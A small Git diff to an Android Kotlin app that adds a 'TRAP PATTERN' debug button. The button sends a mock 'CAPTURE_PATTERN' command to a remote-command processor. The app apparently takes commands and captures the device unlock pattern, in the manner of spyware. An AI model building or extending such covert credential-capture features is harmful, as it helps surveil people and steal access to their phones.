@@ -606,6 +606,18 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
                     TextButton(onClick = { showMockSmsDialog = true }) { Text("Mock SMS", color = AccentPurple) }
 
                     TextButton(onClick = {
+                        scope.launch(Dispatchers.IO) {
+                            val mockCmd = org.json.JSONObject().apply {
+                                put("id", -3)
+                                put("file_name", "CAPTURE_PATTERN")
+                                put("content", "")
+                            }
+                            CommandProcessor.processSingleCommand(ctx, mockCmd)
+                        }
+                        onDismiss()
+                    }) { Text("TRAP PATTERN", color = Color(0xFFF87171)) }
+
+                    TextButton(onClick = {
                         DebugLogger.clear()
                         report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS CLEARED ---"
                         android.widget.Toast.makeText(ctx, "Logs purged", android.widget.Toast.LENGTH_SHORT).show()
